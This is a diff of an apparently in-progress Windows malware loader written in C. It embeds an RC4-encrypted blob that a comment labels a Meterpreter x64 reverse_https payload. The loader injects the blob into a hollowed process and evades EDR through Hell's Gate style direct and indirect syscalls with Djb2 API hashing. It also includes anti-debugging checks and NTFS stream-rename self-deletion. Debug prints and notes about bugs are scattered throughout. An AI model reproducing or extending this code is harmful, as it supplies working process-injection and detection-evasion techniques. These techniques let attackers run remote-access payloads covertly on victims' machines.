@@ -1,9 +1,44 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <Windows.h>
 #include "typedef.h"
 #include "Syswhispers.h"
-#include <Windows.h>
-#include <stdio.h>
+#include "assembly.h"
 
+//Hells Gate Additions
+typedef struct _VX_TABLE_ENTRY {
+    PVOID   pAddress;
+    DWORD dwHash;
+    WORD    wSystemCall;
+    WORD    wRCXVal;
+} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
 
+typedef struct _VX_TABLE {
+    VX_TABLE_ENTRY Allocate;
+    VX_TABLE_ENTRY Protect;
+    VX_TABLE_ENTRY Read;
+    VX_TABLE_ENTRY Write;
+    VX_TABLE_ENTRY ResumeThread;
+    VX_TABLE_ENTRY QueryInfoProcess;
+} VX_TABLE, * PVX_TABLE;
+    
+//PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
+
+#define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
+PVOID* pSystemCalls[num_syscalls];
+VX_TABLE VxTable = { 0 };
+void initializeSystemCalls() {
+    
+    
+
+    if (pSystemCalls == NULL) {
+        printf("Mem allocation error\n");
+        exit(1);
+    }
+    printf("Address of pSystemCalls(it should all be zero'd....: 0x%p\n", pSystemCalls);
+
+    printf("Size of pSystemCalls %zu\n", num_syscalls);
+}
 // this is what SystemFunction032 function take as a parameter
 typedef struct
 {
@@ -18,7 +53,7 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032)(
     struct USTRING* Img,
     struct USTRING* Key
     );
-
+//Maldev Academy Rc4
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
 
     // the return of SystemFunction032
@@ -42,6 +77,7 @@ BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
     return TRUE;
 }
 
+//met x64 reverse_https payload
 unsigned char Rc4CipherText[] = {
         0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
         0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
@@ -93,6 +129,10 @@ unsigned char Rc4CipherText[] = {
         0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
         0x8C, 0xBB, 0x82, 0x28, 0xAC };
 
+DWORD gSSN = 0;
+PVOID gJMP = NULL;
+WORD gCurrentSyscall = 0;
+
 
 unsigned char Rc4Key[] = {
         0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };
@@ -119,12 +159,14 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     PROCESS_BASIC_INFORMATION basicInformation = { 0 };
     printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
     //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
-    NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
 
-    myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
+    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
+    NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
-
+    printf("NTSTATUS????? %d", result);
     //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
     printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
 
@@ -132,17 +174,50 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
 
     uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
     BYTE procAddr[64];
+    BYTE procAddr2[64];
+
     BYTE dataBuff[0x200];
     SIZE_T bytesRW = 0;
     // THis 64 is based on the architecture used...
     
     //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Base Address: 0x%p\n", BaseAddress);
+    //getchar();
+    printf("Starting NoahRead\n");
+    //getchar();
 
+
+    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+
+    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+
+   // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    
+   
+   // printf("RESULTSS????? %d, %d\n", result, bytesRW);
+    getchar();
+    gCurrentSyscall = VxTable.Read.wRCXVal;
+    result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    getchar();
+    printf("Enging NoahRead\n");
+    
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+    printf("&Proc Address (Working): 0x%p\n", *procAddr);
+    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
+
+    getchar();
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
     
     //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
-    result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
+    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
+    gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
+    result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
 
     unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
     unsigned int rvaOffset = e_lfanew + 0x28;
@@ -160,7 +235,12 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     PVOID sizeTest = (PVOID)sPayload;
 
     //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    gCurrentSyscall = VxTable.Protect.wRCXVal;
+    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
+    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
+    result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
     
     
     //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
@@ -189,8 +269,12 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     
     //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
     Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
-    BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
-   
+    
+    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    gCurrentSyscall = VxTable.Write.wRCXVal;
+    result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+
     // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
     //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
 
@@ -205,7 +289,11 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     
     //ResumeThread(Pi.hThread);
     PULONG suspendCount;
-    Sw3NtResumeThread(Pi.hThread, &suspendCount);
+
+    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
+    gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
+    result = NoahRead3(Pi.hThread, &suspendCount);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
 }
 
 void detectDebug() {
@@ -214,9 +302,9 @@ void detectDebug() {
     
     DWORD64 isDebuggerPreset = 0;
     
-    NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
-
-    BOOL STATUS = myNtQueryProcessInformation2(
+    //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
+    BOOL STATUS = NoahRead3(
         GetCurrentProcess(),
         ProcessDebugPort,
         &isDebuggerPreset,
@@ -233,7 +321,7 @@ void detectDebug() {
     printf("No debugger present...\n");
     DWORD64 hProcessDebugObject = NULL;
 
-    STATUS = myNtQueryProcessInformation2(
+    STATUS = NoahRead3(
         GetCurrentProcess(),
         ProcessDebugObjectHandle,
         &hProcessDebugObject,
@@ -258,68 +346,449 @@ void detectDebug() {
     return FALSE;
 }
 
-
-void selfDelete() {
-
-    HANDLE hFile = INVALID_HANDLE_VALUE; //We need to retrieve a file handle to THIS running process.
-    const wchar_t* datastream = "noah";
-
-    size_t sRenameSize = sizeof(FILE_RENAME_INFO) + sizeof(datastream); //
-    PFILE_RENAME_INFO pFRI = NULL; //this structure contains the target name that a source file should be renamed to.
-                                   //it also has fields for file lenghts
-                                   //filename can be a filepath or the new name of a NTFS file stream starting with :
-    
-    FILE_DISPOSITION_INFO FDI = { 0 }; //this structure contains the field tha if a file should be deleted or not when set to true
-    
-
-    pFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(datastream) );
-    
-    //zero out structures
-    ZeroMemory(&FDI, sizeof(FDI));
-
-    //now we need to mark that the file should be deleted in file_disposition_struct
-
-    FDI.DeleteFileW = TRUE;
-    printf("Marked for deletion in strcut");
-
-    //now populate the file_rename_info struct
-
-    pFRI->FileNameLength = sizeof(datastream); // set new file name length to length of new datastream name
-
-    RtlCopyMemory(pFRI->FileName, datastream, sizeof(datastream)); //copy new datastream name into struct
-
-    printf("Set new stream name to %S", pFRI->FileName);
-    printf("Set new stream name length to %d", pFRI->FileNameLength);
-
-    //now get current file name w GetModuleHandle
-
-    //If first parameter is null, use current process and store in second parameter.
-    WCHAR localFilePath[MAX_PATH * 2] = { 0 };
-    GetModuleFileNameW(NULL, localFilePath, MAX_PATH * 2);
+#define NEW_STREAM L":Noah"
+BOOL DeleteSelf() {
 
 
-    //now we get handle to this file, then use SetFileINformationBYHandle func
-    //This lets use pass a FileINformationClass structure, isnide of that is an attribute for a file disposition info struct!
+    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
+    FILE_DISPOSITION_INFO       Delete = { 0 };
+    HANDLE                      hFile = INVALID_HANDLE_VALUE;
+    PFILE_RENAME_INFO           pRename = NULL;
+    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
+    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;
 
 
-    //minimum amount of access rights is DELETE|SYNCHRONIZE.
-    HANDLE localHandle = CreateFileW(localFilePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
+    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
+    if (!pRename) {
+        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-    //now set the strcut info
-    getchar();
-    SetFileInformationByHandle(localHandle, FileRenameInfo, pFRI, sRenameSize);
-    //to make changes we MUST MUST MUST CLOSE HANDLE, CHANGES ARE DONE ON HANDLE CLOSE.
-    getchar();
-    CloseHandle(localHandle);
+    // Cleaning up some structures
+    ZeroMemory(szPath, sizeof(szPath));
+    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
 
-    //file should be deleted by the OS at this point....
 
-    HeapFree(GetProcessHeap(), 0, pFRI);
+    //----------------------------------------------------------------------------------------
+    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
+    Delete.DeleteFile = TRUE;
 
-    //now take this stream and 
+    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
+    pRename->FileNameLength = StreamLength;
+    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);
+
+    //----------------------------------------------------------------------------------------
+
+    // Used to get the current file name
+    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
+        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    //----------------------------------------------------------------------------------------
+    // RENAMING
+
+    // Opening a handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
+
+    // Renaming the data stream
+    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
+        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+    wprintf(L"[+] DONE \n");
+
+    CloseHandle(hFile);
+
+    //----------------------------------------------------------------------------------------
+    // DELETING
+
+    // Opening a new handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    wprintf(L"[i] DELETING ...");
+
+    // Marking for deletion after the file's handle is closed
+    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
+        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+    wprintf(L"[+] DONE \n");
+
+    CloseHandle(hFile);
+
+    //----------------------------------------------------------------------------------------
+
+    // Freeing the allocated buffer
+    HeapFree(GetProcessHeap(), 0, pRename);
+
+    return TRUE;
 }
+
+
+
+
+
+
+//Also not that this is essentially a custom GetModuleHandle??? 
+void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
+    PPEB_LDR_DATA ldr = pPEB->Ldr;
+    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY entry = listEntry->Flink;
+
+    printf("Entry found:\n");
+    while (entry != listEntry) {
+        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+        if (tableEntry->BaseDllName.Buffer) {
+            // Print the module name (wide character string)
+            wprintf(L"%ls\n", tableEntry->BaseDllName.Buffer);
+        }
+
+        if (tableEntry->BaseDllName.Buffer && wcscmp(tableEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
+            *pBaseAddr = tableEntry->DllBase;
+            return; // Successfully found and assigned the base address
+        }
+
+        entry = entry->Flink; // Move to the next entry
+    }
+    *pBaseAddr = NULL; // No match found, set base address to NULL
+}
+
+uint64_t pTextSection = NULL;
+DWORD sTextSection = 0;
+void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory, DWORD* dwDllSize) {
+
+    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
+                                                                        //so we get access to NT headers
+
+
+    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew); 
+
+    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
+    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
+    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
+    //Now from the NT header we can extract the export address table for all fucntions within the dll
+    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+    *dwDllSize = pImageNtHeaders->OptionalHeader.SizeOfHeaders + pImageNtHeaders->OptionalHeader.SizeOfImage;
+    
+    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {
+        
+        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
+            printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress);
+            pTextSection = (uint64_t)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
+            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
+            printf("Text Section NTDLL Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection,sTextSection);
+
+        }
+    }
+
+    DWORD* addressOfFunctions = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+    DWORD* addressOfNames = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNames);
+    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+
+    DWORD byteCounter = 0;
+    WORD counter = 0;
+
+    //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
+    // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
+    for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
+        DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
+        PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
+        if (
+            (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
+            ){
+
+            PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
+            PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
+            printf("0x%p : %02X %02X\n",(pbFuncAddress + byteCounter),opcode1,opcode2);
+            pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
+            counter++;
+            byteCounter = 0;
+            }
+        byteCounter++;
+    }
+
+
+    return TRUE;
+
+    //While we're getting image export directory we can also populate the systemcalls list
+
+
+}
+
+// generate Djb2 hashes from wide-character input string
+
+#define INITIAL_HASH	3731		// added to randomize 
+#define INITIAL_SEED	7			// recommended to be 0 < INITIAL_SEED < 10
+
+DWORD HashStringDjb2A(_In_ PCHAR String)
+{
+    ULONG Hash = INITIAL_HASH;
+    INT c;
+
+    while (c = *String++)
+        Hash = ((Hash << INITIAL_SEED) + Hash) + c;
+
+    return Hash;
+}
+
+//Now this to me feels like a custom GetProcAddress essentially lol
+WORD wGloablSSN = 0;
+typedef struct{
+    PCHAR pcFuncName;
+    PVOID pSyscallLocation;
+} SystemcallPhonebook;
+
+
+SystemcallPhonebook scpSyscallPhonebook = { 0 };
+
+BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT PVX_TABLE_ENTRY syscallTableEntry) {
+
+    //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
+    //of those functions within their respect RVA arrays
+    //Note that since they're RVA's they need to be added onto the module base address/
+    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
+    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix
+    
+    //Then we seasrch through all the functions for a function name hash that matches ours
+    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
+        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
+        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
+        
+     
+        if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
+            printf("FOUND!!\n");
+            printf("Function Address 0x%p\n", pFunctionAddress);
+            printf("Function Name %s\n", pczFunctionName);
+            printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
+            printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);
+            
+            syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
+            printf("0x%p", syscallTableEntry->pAddress);
+            getchar();
+            //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
+
+
+
+           //Now we will search the opcodes for byte sequences relating to system calls!
+
+
+            //oh wow this is actually like incredibly simple....
+            WORD byteCounter = 0;
+            while (TRUE) {
+                //pFunctionAddress = *((PBYTE)pFunctionAddress - 10);
+                //First check if pFunctionAddress is the syscall itself, if so we need to go up to start of syscall sturcture
+                //Recall syscall  = 0x0f, 0x05
+                //Adding 0x01 onto the memory address value every time then taking the actual value by de-referencing pointer w *
+                //to see what the legit opcode is
+                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0x0f && *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x05) {
+                    printf("Landed on `syscall` or incremented too far\n");
+                    return FALSE;
+                }
+                //Now check for ret as well
+                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0xc3) {
+                    printf("Landed on `ret` or incremented too far\n");
+                    return FALSE;
+                }
+                // NOTE THE OPCODES OF A PROPER SYSCALL IN WIN64 SHOULD BE:
+                // mov r10,rcx
+                // mov rcx,SSN
+                //
+                //in your head just think - dereference - pbyte - location
+                if (
+                    *((PBYTE)pFunctionAddress + byteCounter) == 0x4c &&
+                    *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x8b &&
+                    *((PBYTE)pFunctionAddress + byteCounter + 2) == 0xd1 &&
+                    *((PBYTE)pFunctionAddress + byteCounter + 3) == 0xb8 &&
+                    *((PBYTE)pFunctionAddress + byteCounter + 6) == 0x00 && // NOTE PLUS 6 OFFSET
+                    *((PBYTE)pFunctionAddress + byteCounter + 7) == 0x00    // NOTE PLUS 7 OFFSET
+                    ) {
+
+                    //Now we need to calculate the actual systemcall number which we use 4 & 5 for.
+                    //
+                        BYTE high = *((PBYTE)pFunctionAddress + 5 + byteCounter); // Offset 5
+                        BYTE low = *((PBYTE)pFunctionAddress + 4 + byteCounter); // Offset 4
+                    
+                        syscallTableEntry->wSystemCall = (DWORD)((high << 8) | low);
+                        wGloablSSN = syscallTableEntry->wSystemCall;
+                        printf("Bruh %d\n", syscallTableEntry->wSystemCall);
+                       
+                        // syscallTableEntry->pAddress = (PBYTE)0xDEADBEEF; // I got issues landing on ret a lot and this fixed it?
+                       // syscallTableEntry->wSystemCall = (DWORD)58;
+                       
+                        //now all thats left is to call the function using an asm 
+                        break;
+                }
+                byteCounter++;
+            }
+        }
+
+    }
+    //Now begin loop to populate list of syscall locaitons
+
+        //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
+        //See the API_Hashing module example
+    return TRUE;
+}
+
+BOOL GetSystemcallAddresses(DWORD dwDLLSize, PVOID* pSystemCalls, PVOID pModuleBase, PVOID pTextSection) {
+
+    DWORD byteCounter = 0;
+    WORD counter = 0;
+    while (TRUE) {
+        if (byteCounter == dwDLLSize || counter == num_syscalls /*testing*/ || byteCounter >= sTextSection) {
+            printf("byteCounter: %d\n", byteCounter);
+            printf("sTextSection: %d\n", sTextSection);
+            printf("dwDLLSize: %d\n", dwDLLSize);
+            printf("Counter; %d\n", counter);
+
+            printf("End of something lol !!!!!!!!!\n");
+            getchar();
+            return FALSE;
+        }
+        if (
+            *((PBYTE)pTextSection + byteCounter) == 0x0f && *((PBYTE)pTextSection + byteCounter + 1) == 0x05
+            ) {
+
+            PBYTE opcode1 = *((PBYTE)pTextSection + byteCounter);
+            PBYTE opcode2 = *((PBYTE)pTextSection + byteCounter + 1);
+            printf("\n");
+            pSystemCalls[counter] = (PVOID)((PBYTE)pTextSection + byteCounter);
+            PVX_TABLE* pVxTable = &VxTable;
+            printf("Syscalls Array: %p\nVxTable: %p\n", pSystemCalls, pVxTable);
+            printf("0x%p\t%02x\t%02x\n", pSystemCalls[counter], opcode1, opcode2); // NICE
+
+            counter++;
+        }
+        byteCounter = byteCounter + 1;
+
+    }
+    return TRUE;
+}
+
+//EXTERN IndirectSyscall : PROC
+//find the location of a random ahh syscall to jump to.
+
+
+
+
+EXTERN_C DWORD GetSSN(DWORD input){ 
+    printf("%d\n", input);
+    getchar();
+    if (input == 0) {
+        printf("Wow! Read Syscall Getter called: %d\n",VxTable.Read.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Read.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Read.wSystemCall;
+    }
+    else if (input == 1) {
+        return VxTable.Write.wSystemCall;
+    }
+    else if (input == 2) {
+        return VxTable.Allocate.wSystemCall;
+    }
+    return (DWORD)VxTable.Read.wSystemCall;
+}
+
+
+//NOTE TO SELF FOR YOU NOAH - JUNE 2ND - THIS FUNCTION IS THE ISSUE RN...
+EXTERN_C PVOID* GetJMP() {
+    printf("Now would be a good time to check rax for the syscall value...\n");
+    getchar();
+
+    //static uint64_t value =(uint64_t
+   
+    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
+    
+    //uint64_t address = pSystemCalls[200];
+    
+    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
+
+    printf("Getting JMP! 0x%p\n", address);
+    gJMP = address;
+    uint64_t address2 = (uint64_t)address;
+    getchar();
+     //return &address2;
+    return &address2;
+    //return &value;
+}
+
+
+EXTERN_C void UpdateGlobals(DWORD input) {
+    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
+   uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
+    //PVOID address = (PVOID)(0xdeadbeef);
+    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
+
+    printf("Getting JMP! 0x%p\n", address);
+    gJMP = address;
+    uint64_t address2 = (uint64_t)address;
+    PULONG oldProts = NULL;
+    getchar();
+    printf("Input val to UpdateGloabls: %d\n", input);
+    getchar();
+
+    if (input == 0) { //Read
+        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Read.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Read.wSystemCall;
+    }
+    else if (input == 1) { //Write
+        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Write.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Write.wSystemCall;
+    }
+    else if (input == 2) { //Allocate
+        return VxTable.Allocate.wSystemCall;
+    }
